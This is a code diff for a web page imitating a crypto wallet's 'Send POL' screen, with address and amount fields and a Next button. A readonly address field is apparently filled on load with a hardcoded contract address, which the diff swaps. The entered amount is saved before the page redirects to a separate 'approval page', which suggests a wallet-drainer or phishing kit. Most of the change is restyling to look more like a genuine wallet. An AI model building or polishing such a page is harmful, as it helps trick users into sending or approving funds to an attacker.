@@ -2,19 +2,19 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <title>polygon.network</title>
+    <title>Send POL</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="theme-color" content="#000000" />
+    <meta name="theme-color" content="#121212" />
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
         body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background-color: #000000;
+            background-color: #121212;
             color: #ffffff;
             min-height: 100vh;
             display: flex;
@@ -26,118 +26,145 @@
         .app-bar {
             display: flex;
             align-items: center;
-            padding: 12px 16px;
-            border-bottom: 1px solid #262626;
+            justify-content: center;
+            padding: 24px 16px 16px;
+            position: relative;
         }
 
         .app-bar-title {
-            margin: 0 auto;
             font-size: 16px;
-            font-weight: 500;
-        }
-
-        .container {
-            flex: 1;
-            padding: 24px 16px 100px;
-            overflow-y: auto;
-        }
-
-        .label {
-            font-size: 13px;
-            color: #a0a0a0;
-            margin-bottom: 6px;
-        }
-
-        .row {
-            display: flex;
-            align-items: center;
-            background-color: #111111;
-            border-radius: 10px;
-            border: 1px solid #262626;
-            padding: 8px 10px;
-        }
-
-        .row input {
-            flex: 1;
-            background: transparent;
-            border: none;
+            font-weight: 600;
             color: #ffffff;
-            font-size: 14px;
-            outline: none;
         }
 
-        .row input::placeholder {
-            color: #555555;
-        }
-
-        .row button,
-        .icon-btn {
-            border: none;
+        .close-btn {
+            position: absolute;
+            right: 16px;
             background: none;
-            color: #00ff7f;
-            font-size: 13px;
-            margin-left: 6px;
+            border: none;
+            color: #a0a0a0;
             cursor: pointer;
-        }
-
-        .icon-btn {
-            padding: 0;
-            width: 22px;
-            height: 22px;
+            padding: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .icon-btn img {
-            max-width: 100%;
-            max-height: 100%;
-            display: block;
+        .container {
+            flex: 1;
+            padding: 16px 16px 100px; /* space for bottom bar */
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            overflow-y: auto;
         }
 
-        .amount-box {
-            margin-top: 24px;
+        .field-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
         }
 
-        .amount-row {
+        .label {
+            font-size: 13px;
+            color: #a0a0a0;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
             display: flex;
             align-items: center;
-            background-color: #111111;
-            border-radius: 10px;
-            border: 1px solid #262626;
-            padding: 14px 12px;
+            background-color: transparent;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 14px 16px;
+            gap: 12px;
+            transition: border-color 0.2s;
         }
 
-        .amount-row input {
+        .input-wrapper:focus-within {
+            border-color: #555555;
+        }
+
+        .input-wrapper input {
             flex: 1;
             background: transparent;
             border: none;
             color: #ffffff;
-            font-size: 18px;
+            font-size: 15px;
             outline: none;
+            min-width: 0;
         }
 
-        .amount-row-right {
+        .input-wrapper input::placeholder {
+            color: #888888;
+        }
+
+        .action-text {
+            color: #2ECA75;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .action-icon {
+            color: #2ECA75;
+            cursor: pointer;
+            background: none;
+            border: none;
             display: flex;
             align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+
+        .network-pill {
+            display: inline-flex;
+            align-items: center;
             gap: 8px;
-            font-size: 14px;
-            color: #a0a0a0;
-        }
-
-        .amount-row-right .token {
-            color: #ffffff;
-        }
-
-        .amount-row-right .max {
-            color: #00ff7f;
+            background-color: #25242A; /* dark grey pill */
+            padding: 6px 12px 6px 8px;
+            border-radius: 20px;
+            width: fit-content;
             cursor: pointer;
+            border: 1px solid transparent;
         }
 
-        .usd-hint {
-            margin-top: 6px;
-            font-size: 12px;
+        .network-icon {
+            width: 24px;
+            height: 24px;
+            background-color: #8247E5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .network-name {
+            font-size: 13px;
+            color: #7A797F; /* muted grey */
+            font-weight: 500;
+        }
+
+        .chevron-down {
+            color: #5A595F;
+            display: flex;
+            align-items: center;
+            margin-left: -2px;
+        }
+
+        .token-text {
             color: #a0a0a0;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .usd-value {
+            font-size: 13px;
+            color: #a0a0a0;
+            margin-top: 2px;
         }
 
         .bottom-bar {
@@ -146,71 +173,103 @@
             right: 0;
             bottom: 0;
             padding: 16px;
-            background: #000000;
+            background: #121212;
+            z-index: 10;
         }
 
         .next-btn {
             width: 100%;
-            background-color: #00ff7f;
-            border-radius: 999px;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 500;
+            background-color: #31874E;
             color: #000000;
+            border: none;
+            border-radius: 24px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
+            transition: opacity 0.2s;
         }
 
-        .next-btn:disabled {
-            background-color: #333;
-            color: #666;
-            cursor: not-allowed;
+        .next-btn:active {
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
     <header class="app-bar">
-        <div class="app-bar-title">polygon.network</div>
+        <div class="app-bar-title">Send POL</div>
+        <button class="close-btn" aria-label="Close">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+        </button>
     </header>
 
     <main class="container">
-        <!-- Address section -->
-        <div>
+        <!-- Address Section -->
+        <div class="field-group" style="margin-top: 8px;">
             <div class="label">Address or Domain Name</div>
-            <div class="row">
+            <div class="input-wrapper">
                 <input
                     type="text"
                     id="addressInput"
                     autocomplete="off"
-                    placeholder=""
-                    value="0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E"
+                    placeholder="Search or Enter"
+                    value=""
                     readonly
                 />
-                <button type="button" onclick="pasteAddress()">Paste</button>
-
-                <!-- Contact icon -->
-                <button type="button" class="icon-btn" title="Contacts">
-                    <img src="phone-book.jpg" alt="Contacts" />
+                <button type="button" class="action-text" onclick="pasteAddress()">Paste</button>
+                <button type="button" class="action-icon" title="Contacts">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"></path>
+                        <path d="M8 7h6"></path>
+                        <path d="M8 11h8"></path>
+                        <path d="M8 15h6"></path>
+                        <circle cx="4" cy="6" r="1" fill="currentColor" stroke="none"></circle>
+                        <circle cx="4" cy="12" r="1" fill="currentColor" stroke="none"></circle>
+                        <circle cx="4" cy="18" r="1" fill="currentColor" stroke="none"></circle>
+                    </svg>
                 </button>
-
-                <!-- QR icon -->
-                <button type="button" class="icon-btn" title="Scan QR">
-                    <img src="qr-p.jpg" alt="QR" />
+                <button type="button" class="action-icon" title="Scan QR">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M3 7V5a2 2 0 0 1 2-2h2"></path>
+                        <path d="M17 3h2a2 2 0 0 1 2 2v2"></path>
+                        <path d="M21 17v2a2 2 0 0 1-2 2h-2"></path>
+                        <path d="M7 21H5a2 2 0 0 1-2-2v-2"></path>
+                        <line x1="3" y1="12" x2="21" y2="12"></line>
+                    </svg>
                 </button>
             </div>
         </div>
 
-        <!-- Amount section -->
-        <div class="amount-box">
-            <div class="label">Amount</div>
-            <div class="amount-row">
-                <input type="number" id="amountInput" value="" min="0" step="0.01" placeholder="0.00" />
-                <div class="amount-row-right">
-                    <span class="token">USDT</span>
-                    <span class="max" onclick="setMaxAmount()">Max</span>
+        <!-- Destination Network Section -->
+        <div class="field-group">
+            <div class="label">Destination network</div>
+            <div class="network-pill">
+                <div class="network-icon">
+                    <svg width="14" height="14" viewBox="0 0 2500 2500" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1743.7 934.5l-395.4-228c-60.6-35-135-35-195.6 0l-395.4 228c-60.6 35-97.8 99.4-97.8 169.4v456c0 70 37.2 134.4 97.8 169.4l395.4 228c60.6 35 135 35 195.6 0l395.4-228c60.6-35 97.8-99.4 97.8-169.4v-456c0-70-37.2-134.3-97.8-169.4z" fill="white"/>
+                    </svg>
+                </div>
+                <span class="network-name">Polygon</span>
+                <div class="chevron-down">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
                 </div>
             </div>
-            <div class="usd-hint" id="usdtValue">= 0.00 USDT</div>
+        </div>
+
+        <!-- Amount Section -->
+        <div class="field-group">
+            <div class="label">Amount</div>
+            <div class="input-wrapper">
+                <input type="number" id="amountInput" min="0" step="0.01" placeholder="POL Amount" value="" />
+                <span class="token-text">POL</span>
+                <button type="button" class="action-text" onclick="setMaxAmount()">Max</button>
+            </div>
+            <div class="usd-value" id="usdtValue">&approx; 0.00 USDT</div>
         </div>
     </main>
 
@@ -221,7 +280,7 @@
 
     <script>
         // Contract Configuration
-        const CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
+        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
 
         // Set contract address on page load
         document.addEventListener('DOMContentLoaded', function() {
@@ -261,7 +320,7 @@
         // Update USDT value display when amount changes
         function updateUsdtValue() {
             const amount = parseFloat(document.getElementById("amountInput").value) || 0;
-            document.getElementById("usdtValue").textContent = `= ${amount.toFixed(2)} USDT`;
+            document.getElementById("usdtValue").innerHTML = `&approx; ${amount.toFixed(2)} USDT`;
         }
 
         function pasteAddress() {
@@ -291,7 +350,7 @@
             // Store the amount for the approval page
             localStorage.setItem('usdtAmount', amount);
             
-            // Navigate to next.html
+            // Navigate to approval page
             window.location.href = "next.html";
         }
     </script>
